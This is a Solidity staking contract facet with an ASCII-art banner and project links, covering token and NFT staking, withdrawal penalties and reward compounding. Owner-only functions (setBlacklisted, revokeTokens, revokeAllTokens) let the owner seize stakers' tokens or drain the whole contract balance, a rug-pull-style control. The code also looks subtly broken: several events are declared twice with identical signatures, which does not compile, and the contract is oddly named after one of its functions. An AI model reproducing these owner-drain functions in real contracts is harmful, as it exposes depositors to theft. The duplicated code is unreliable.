//                                                    */**********,**,,,,,,,,,,,,,/,.
//                                             ./********************,,,,,,,,,,,,,,,,,,,,,#.
//                                         ***********************,////,,*,,,,,,,,,,,,,,,,,,,,,/
//                                    (***************..                           .(,,,,,,,,,,,,,,*
//                                 (************,                                         /,,,,,,,,,,,,
//                              /***********                                                  .,,,,,,,,,,,,
//                            ******#                         *%%#######%                            %*,,,,,/
//                                      #**,,,,,,,,,,,,,,,,,,,,,********/   *******************/,(
//                           *.*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,**,*****/   *******************************(*
//                   ,/.,,,,,,,,,,,,,,,,,,,,,,,,,,,,*/.,*/(      /******/      .(/*,//*****************************/.
//                #.....,,,,,,,,,,,,,,,#                         /,*****/                         ,(*******************/
//                 ......,,,,#            //,*,***************,  /***************************/*#             (********/#
//                 ,.....,*     ,*,,,,,,,,,,,,,***************,  /,*************************************/,/    .******/
//                  ,...,,,/  ...,,,,,,,,,,,,,,********/(,,*/(,            ((/**,(//***********************(   *******#
//                  *...,,.,    ,,,,,,,,*(                                                      %//********   (******(
//               /   ...,,,,,   *,,,,,,,             .,,,,,,,,,,,,,,,,,**************             .*******   (*******   *.
//              /*/   ,.,,,,,,   (,,,,,,*    ,,,**  ,,,,,,,,,,,,,,,,,,****************/  ,,**,   (*******   .*******   (..
//              ///*   *,,,,,,,   /,,,,,,,    .  */,,,,,,                        ******##,  *   ,*******,  /*******    ....
//             (/*/*/   ,,,,,,,,   ,,,,,,,,     ...,,,,,,   /,**.         /,**/   *******//    .*******.  .********  *.....
//             //****/   ,,,,,,,,   .,,,,,,,    ...,,,,,,  ,,,***(      *,,,***(  *******//   (*******   .*******.   .......
//             //****/                          ...,,,,,,  ,,,***        .,,***   *******//             ,*******,   /......(
//             //****/     #//////////////////* /..,,,,,*                        .*******/  (((((((((((/********    #....../
//             //****/      (....,.,,,,,,,,,,,,,   /,,,,,,,*...................(*******    *******************      /......(
//             //*****.      /.,.,,,,,,,,,,,,,,,,*   ,,,,,,,,,,,,,,,,,,***************   *******************/       .,......
//             #//****%        ..,,,,,,   /,,,,,,,*     ,*,,,,,,,,,,,,***********(.     ********                    ,......
//              //*****         ,,.,,,,,,   ,,,,,,,,.   ,(.,,,,*           ****,.#    /*******/   ,,,,,,,,         #,.....*
//              ,/*****(         ..,,,,,,*   *,,,,,,,*    *,,,,,,        .******    .********    ********          ,,.....
//               /******(          ,,,,,,,,    ,,,,,,,,.    ,,,,,,/     ******.    ********.   (*******#          ,......*
//                *******           .,,,,,,,*   (,,,,,,,,    .,,,,,,/ ******/    ,********    ********           ,,,,.../
//                 *******/           ,,,,,,,,.   *,,,,,,,*    *,,,,,,*****    .********.   /*******,           ,,,,,..*
//                  *******/           ,,,,,,,,,    ,,,,,,,,/    /,,,,***     ********(   (********           .,,,.,,.,
//                   ********,           ,,,,,,,,/   .,,,,,,,,,    *,,*,    *********   /********.           ,,,,,,,.,
//                    #********           .,,,,,,,,/   /,,,,,,,,(    .    *,*******    *********           ,,,,,,,,,
//                      /*******/           *,,,,,,,,.   .,,,,,,,,(     *,*,*****.   *********           *,,,,,,,,*
//                        /*********          /,,,,,,,,*   /,,,,,,,,( ,,,,*,***    *********           ,,,,,,,,,,
//                          *********/          ,,,,,,,,,    /,,,,,,,,,,,,,,*    /********.         #,,,,,,,,,#
//                            (**********         /,,,,,,,,.   ,,,,,,,,,,,*    *********         *,,,,,,,,,,
//                              ,***********,       ,,,,,,,,,,   ,,,,,,,*    **********      /*,,,,,,,,,,/
//                                  *************.    ,,,,,,,,,*    *,(   .*********.   .(,,,,,,,,,,,,/
//                                     (************,   .,,,,,,,,,      (,,,******    ,,,,,,,,,,,,,
//                                         ,**********(    ,,,,,,,,,(,,,,,,,****    ,,,,,,,,,,*
//                                              ,/*******    *,,,,,,,,,,,,,***   .,,,,,,,.
//                                                      /,*    (,,,,,,,,,,/    //,*
//                                                                *,,,,,/
//                                                                   /
//
//          Telegram: https://t.me/bankaieth
//          Twitter: https://twitter.com/Bank_AIETH
//          Website: https://bankai.app/
//          Staking: https://dapp.bankai.app/staking
//
//SPDX-License-Identifier: MIT

pragma solidity 0.8.24;
import "./TestLib.sol";
contract setCustomEmergencyWithdrawPenaltyFacet is DividendTracker, Ownable {
    using EnumerableSet for EnumerableSet.UintSet;
    using EnumerableSet for EnumerableSet.AddressSet;

    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    event EmergencyWithdraw(
        address indexed user,
        uint256 amountForUser,
        uint256 amountForPenalty
    );
    event StakedNFT(
        address indexed nftAddress,
        uint256 indexed tokenId,
        address indexed sender
    );
    event UnstakedNFT(
        address indexed nftAddress,
        uint256 indexed tokenId,
        address indexed sender
    );
    event UnstakedNFT(
        address indexed nftAddress,
        uint256 indexed tokenId,
        address indexed sender
    );
    event Deposit(address indexed user, uint256 amount);
    event Deposit(address indexed user, uint256 amount);
    function setCustomEmergencyWithdrawPenalty(
        address[] memory _addresses,
        uint8[] memory _customEmergencyWithdrawPenalty,
        bool _hasCustomEmergencyWithdrawPenalty
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses.length; i++) {
            address addy = _addresses[i];
            TestLib.User memory user = ds.users[addy];
            if (_hasCustomEmergencyWithdrawPenalty) {
                uint8 customEmergencyWithdrawPenalty = _customEmergencyWithdrawPenalty[
                        i
                    ];
                require(
                    customEmergencyWithdrawPenalty <= 100,
                    "Cannot set emergency penalty over 100%"
                );
                user.hasCustomEmergencyWithdrawPenalty = true;
                user
                    .customEmergencyWithdrawPenalty = customEmergencyWithdrawPenalty;
            } else {
                user.hasCustomEmergencyWithdrawPenalty = false;
                user.customEmergencyWithdrawPenalty = 0;
            }
            ds.users[addy] = user;
        }
    }
    function setBlacklisted(
        address[] memory _addresses,
        bool _blacklisted
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 tokensToTransfer;
        for (uint256 i = 0; i < _addresses.length; i++) {
            address addy = _addresses[i];
            TestLib.User memory user = ds.users[addy];
            if (_blacklisted) {
                if (user.withdrawableTokens > 0) {
                    tokensToTransfer += user.withdrawableTokens;
                }
                user.baseTokensStaked = 0;
                user.withdrawableTokens = 0;
                user.stakingDuration = 0;
                user.holderUnlockTime = 0;
                setBalance(payable(addy), 0);
            }
            if (ds.userList.contains(addy)) {
                ds.userList.remove(addy);
            }
            user.blacklisted = _blacklisted;
            ds.users[addy] = user;
        }
        if (tokensToTransfer > 0) {
            ds.alphaToken.transfer(address(owner()), tokensToTransfer);
        }
    }
    function revokeTokens(address[] memory _addresses) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        uint256 tokensToTransfer;
        for (uint256 i = 0; i < _addresses.length; i++) {
            address addy = _addresses[i];
            TestLib.User storage user = ds.users[addy];
            if (user.withdrawableTokens > 0) {
                tokensToTransfer += user.withdrawableTokens;
                user.withdrawableTokens = 0;
            }
        }
        if (tokensToTransfer > 0) {
            ds.alphaToken.transfer(address(owner()), tokensToTransfer);
        }
    }
    function revokeAllTokens() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory _addresses = getUserList();
        ds.alphaToken.transfer(
            address(owner()),
            ds.alphaToken.balanceOf(address(this))
        );
        for (uint256 i = 0; i < _addresses.length; i++) {
            address addy = _addresses[i];
            TestLib.User storage user = ds.users[addy];
            if (user.withdrawableTokens > 0) {
                user.withdrawableTokens = 0;
            }
        }
    }
    function updateEmergencyWithdrawPenalty(
        uint256 _newPerc
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(_newPerc <= 100, "Cannot set higher than 100%");
        ds.emergencyWithdrawPenalty = _newPerc;
    }
    function updatePercBoostPerNft(uint256 _newPerc) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.percBoostPerNft = _newPerc;
    }
    function updateMaxNftsStaked(uint256 _newMax) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.maxStakedNftsAllowed = _newMax;
    }
    function updateNftAddress(address _newNftAddress) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.nftAddress = IERC721(_newNftAddress);
    }
    function addStakingPeriod(
        uint256 _newStakingPeriod,
        uint256 _newStakingBoost
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            !ds.stakingPeriodsInDays.contains(_newStakingPeriod),
            "Staking Period already added"
        );
        ds.stakingPeriodsInDays.add(_newStakingPeriod);
        ds.stakingPeriodBoost[_newStakingPeriod] = _newStakingBoost;
    }
    function removeStakingPeriod(uint256 _newStakingPeriod) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.stakingPeriodsInDays.contains(_newStakingPeriod),
            "Staking Period doesn't exist"
        );
        ds.stakingPeriodsInDays.remove(_newStakingPeriod);
        ds.stakingPeriodBoost[_newStakingPeriod] = 0;
    }
    function updateStakingBoost(
        uint256 _stakingPeriod,
        uint256 _newStakingBoost
    ) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.stakingPeriodsInDays.contains(_stakingPeriod),
            "Staking Period doesn't exist"
        );
        ds.stakingPeriodBoost[_stakingPeriod] = _newStakingBoost;
    }
    function forceUpdate(address[] memory _addresses) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses.length; i++) {
            address addy = _addresses[i];
            TestLib.User memory user = ds.users[addy];
            if (!user.blacklisted) {
                setInternalBalance(addy, user);
            }
        }
    }
    function forceUpdateAll() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        address[] memory _addresses = getUserList();
        for (uint256 i = 0; i < _addresses.length; i++) {
            address addy = _addresses[i];
            TestLib.User memory user = ds.users[addy];
            if (!user.blacklisted) {
                setInternalBalance(addy, user);
            }
        }
    }
    function allocateStake(
        address[] memory _addresses,
        uint112[] memory _amounts,
        uint48[] memory _durations
    ) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            depositInternal(_addresses[i], _amounts[i], _durations[i]);
        }
    }
    function allocateStakeRevoked(
        address[] memory _addresses,
        uint112[] memory _amounts,
        uint48[] memory _durations
    ) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            depositInternalRevoked(_addresses[i], _amounts[i], _durations[i]);
        }
    }
    function stopRewards(address[] memory _addresses) external onlyOwner {
        for (uint256 i = 0; i < _addresses.length; i++) {
            setInternalBalanceToZero(_addresses[i]);
        }
    }
    function deposit(
        uint256 _amount,
        uint48 _stakingDurationInDays
    ) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(_amount > 0, "Zero Amount");
        require(!user.blacklisted, "Blacklisted");
        require(
            ds.stakingPeriodsInDays.contains(_stakingDurationInDays),
            "Invalid staking period"
        );
        require(
            user.stakingDuration <= _stakingDurationInDays,
            "Cannot stake for a shorter period of time"
        );
        if (!ds.userList.contains(msg.sender)) {
            ds.userList.add(msg.sender);
        }

        user.stakingDuration = _stakingDurationInDays;
        user.holderUnlockTime = uint48(
            block.timestamp + (_stakingDurationInDays * 1 days)
        );

        uint112 amountTransferred = 0;
        uint112 initialBalance = uint112(
            ds.alphaToken.balanceOf(address(this))
        );
        ds.alphaToken.transferFrom(address(msg.sender), address(this), _amount);
        amountTransferred = uint112(
            ds.alphaToken.balanceOf(address(this)) - initialBalance
        );

        user.baseTokensStaked += amountTransferred;
        user.withdrawableTokens += amountTransferred;

        setInternalBalance(msg.sender, user);

        emit Deposit(msg.sender, _amount);
        ds.users[msg.sender] = user;
    }
    function extendLock(uint48 _stakingDurationInDays) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(!user.blacklisted, "Blacklisted");
        require(
            ds.stakingPeriodsInDays.contains(_stakingDurationInDays),
            "Invalid staking period"
        );
        require(
            user.stakingDuration <= _stakingDurationInDays,
            "Cannot stake for a shorter period of time"
        );

        user.stakingDuration = _stakingDurationInDays;
        user.holderUnlockTime = uint48(
            block.timestamp + (_stakingDurationInDays * 1 days)
        );

        setInternalBalance(msg.sender, user);

        ds.users[msg.sender] = user;
    }
    function withdrawTokens() external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(!user.blacklisted, "Blacklisted");
        require(user.holderUnlockTime <= block.timestamp, "Too early");
        uint256 amount = user.withdrawableTokens;
        require(amount > 0, "No tokens with withdraw");

        user.baseTokensStaked = 0;
        user.withdrawableTokens = 0;
        user.stakingDuration = 0;
        user.holderUnlockTime = 0;
        ds.users[msg.sender] = user;

        ds.alphaToken.transfer(address(msg.sender), amount);

        setBalance(payable(msg.sender), 0);
        if (ds.userList.contains(msg.sender)) {
            ds.userList.remove(msg.sender);
        }

        emit Withdraw(msg.sender, amount);
    }
    function emergencyWithdrawTokens() external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(!user.blacklisted, "Blacklisted");
        uint256 amountForPenalty;
        if (user.hasCustomEmergencyWithdrawPenalty) {
            amountForPenalty =
                (user.withdrawableTokens *
                    user.customEmergencyWithdrawPenalty) /
                100;
        } else {
            amountForPenalty =
                (user.withdrawableTokens * ds.emergencyWithdrawPenalty) /
                100;
        }
        uint256 amountForUser = user.withdrawableTokens - amountForPenalty;
        require(user.withdrawableTokens > 0, "No tokens with withdraw");

        user.baseTokensStaked = 0;
        user.withdrawableTokens = 0;
        user.stakingDuration = 0;
        user.holderUnlockTime = 0;
        ds.users[msg.sender] = user;

        ds.alphaToken.transfer(address(msg.sender), amountForUser);
        if (amountForPenalty > 0) {
            ds.alphaToken.transfer(address(owner()), amountForPenalty);
        }

        setBalance(payable(msg.sender), 0);
        if (ds.userList.contains(msg.sender)) {
            ds.userList.remove(msg.sender);
        }

        emit EmergencyWithdraw(msg.sender, amountForUser, amountForPenalty);
    }
    function stakeNfts(uint256[] calldata tokenIds) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(!user.blacklisted, "Blacklisted");
        require(address(ds.nftAddress) != address(0), "Nft Address not set");

        require(
            tokenIds.length +
                ds
                .holderNftsStaked[address(ds.nftAddress)][msg.sender]
                    .length() <=
                ds.maxStakedNftsAllowed,
            "can't stake this many NFTs"
        );

        for (uint256 i = 0; i < tokenIds.length; i++) {
            require(
                ds.nftAddress.getApproved(tokenIds[i]) == address(this) ||
                    ds.nftAddress.isApprovedForAll(msg.sender, address(this)),
                "Must approve token to be sent"
            );
            ds.nftAddress.transferFrom(msg.sender, address(this), tokenIds[i]);
            ds.holderNftsStaked[address(ds.nftAddress)][msg.sender].add(
                tokenIds[i]
            );
            emit StakedNFT(address(ds.nftAddress), tokenIds[i], msg.sender);
        }

        setInternalBalance(msg.sender, user);
    }
    function unstakeNfts(uint256[] calldata tokenIds) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(!user.blacklisted, "Blacklisted");
        require(address(ds.nftAddress) != address(0), "Nft Address not set");

        for (uint256 i = 0; i < tokenIds.length; i++) {
            require(
                ds
                .holderNftsStaked[address(ds.nftAddress)][msg.sender].contains(
                        tokenIds[i]
                    ),
                "Nft not owned"
            );
            ds.nftAddress.transferFrom(address(this), msg.sender, tokenIds[i]);
            ds.holderNftsStaked[address(ds.nftAddress)][msg.sender].remove(
                tokenIds[i]
            );
            emit UnstakedNFT(address(ds.nftAddress), tokenIds[i], msg.sender);
        }

        setInternalBalance(msg.sender, user);
    }
    function emergencyWithdrawNfts(
        uint256[] calldata tokenIds,
        address _nftAddress
    ) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[msg.sender];
        require(
            address(_nftAddress) != address(0) &&
                _nftAddress != address(ds.nftAddress),
            "Nft Address not correct"
        );

        for (uint256 i = 0; i < tokenIds.length; i++) {
            require(
                ds.holderNftsStaked[address(_nftAddress)][msg.sender].contains(
                    tokenIds[i]
                ),
                "Nft not owned"
            );
            IERC721(_nftAddress).transferFrom(
                address(this),
                msg.sender,
                tokenIds[i]
            );
            ds.holderNftsStaked[address(_nftAddress)][msg.sender].remove(
                tokenIds[i]
            );
            emit UnstakedNFT(address(_nftAddress), tokenIds[i], msg.sender);
        }

        setInternalBalance(msg.sender, user);
    }
    function claim() external nonReentrant {
        processAccount(payable(msg.sender), false);
    }
    function compound(uint256 minOutput) external nonReentrant {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User storage user = ds.users[msg.sender];
        require(!user.blacklisted, "Blacklisted");
        uint256 amountEthForCompound = _withdrawDividendOfUserForCompound(
            payable(msg.sender)
        );
        if (amountEthForCompound > 0) {
            uint256 initialBalance = ds.alphaToken.balanceOf(address(this));
            buyBackTokens(amountEthForCompound, minOutput);
            uint112 amountTransferred = uint112(
                ds.alphaToken.balanceOf(address(this)) - initialBalance
            );
            user.baseTokensStaked += amountTransferred;
            setInternalBalance(msg.sender, user);
        } else {
            revert("No rewards");
        }
    }
    function _withdrawDividendOfUserForCompound(
        address payable user
    ) internal returns (uint256 _withdrawableDividend) {
        _withdrawableDividend = withdrawableDividendOf(user);
        if (_withdrawableDividend > 0) {
            withdrawnDividends[user] =
                withdrawnDividends[user] +
                _withdrawableDividend;
            emit DividendWithdrawn(user, _withdrawableDividend);
        }
    }
    function balanceOf(address _address) external view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.users[_address].baseTokensStaked;
    }
    function buyBackTokens(uint256 ethAmountInWei, uint256 minOut) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        // generate the uniswap pair path of weth -> eth
        address[] memory path = new address[](2);
        path[0] = ds.dexRouter.WETH();
        path[1] = address(ds.alphaToken);

        // make the swap
        ds.dexRouter.swapExactETHForTokensSupportingFeeOnTransferTokens{
            value: ethAmountInWei
        }(minOut, path, address(this), block.timestamp);
    }
    function setInternalBalance(
        address _address,
        TestLib.User memory user
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (user.blacklisted) {
            setBalance(payable(_address), 0);
        } else {
            setBalance(
                payable(_address),
                (((user.baseTokensStaked *
                    (100 + ds.stakingPeriodBoost[user.stakingDuration])) /
                    100) * getStakingMultiplier(_address)) / 100
            );
        }
    }
    function depositInternal(
        address _user,
        uint112 _amount,
        uint48 _stakingDurationInDays
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[_user];
        require(_amount > 0, "Zero Amount");
        require(
            ds.stakingPeriodsInDays.contains(_stakingDurationInDays),
            "Invalid staking period"
        );
        if (!ds.userList.contains(_user)) {
            ds.userList.add(_user);
        }

        user.stakingDuration = _stakingDurationInDays;
        user.holderUnlockTime = uint48(
            block.timestamp + (_stakingDurationInDays * 1 days)
        );

        user.baseTokensStaked += _amount;
        user.withdrawableTokens += _amount;

        setInternalBalance(_user, user);

        emit Deposit(_user, _amount);
        ds.users[_user] = user;
    }
    function depositInternalRevoked(
        address _user,
        uint112 _amount,
        uint48 _stakingDurationInDays
    ) internal {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        TestLib.User memory user = ds.users[_user];
        require(_amount > 0, "Zero Amount");
        require(
            ds.stakingPeriodsInDays.contains(_stakingDurationInDays),
            "Invalid staking period"
        );
        if (!ds.userList.contains(_user)) {
            ds.userList.add(_user);
        }

        user.stakingDuration = _stakingDurationInDays;
        user.holderUnlockTime = uint48(
            block.timestamp + (_stakingDurationInDays * 1 days)
        );

        user.baseTokensStaked += _amount;

        setInternalBalance(_user, user);

        emit Deposit(_user, _amount);
        ds.users[_user] = user;
    }
    function getStakingMultiplier(
        address holder
    ) public view returns (uint256) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.holderNftsStaked[address(ds.nftAddress)][holder].length() == 0) {
            return 100;
        }
        // additive boost per NFT staked
        return
            100 +
            (ds.holderNftsStaked[address(ds.nftAddress)][holder].length() *
                ds.percBoostPerNft);
    }
    function setInternalBalanceToZero(address _address) internal {
        setBalance(payable(_address), 0);
    }
    function getUserList() public view returns (address[] memory) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        return ds.userList.values();
    }
}
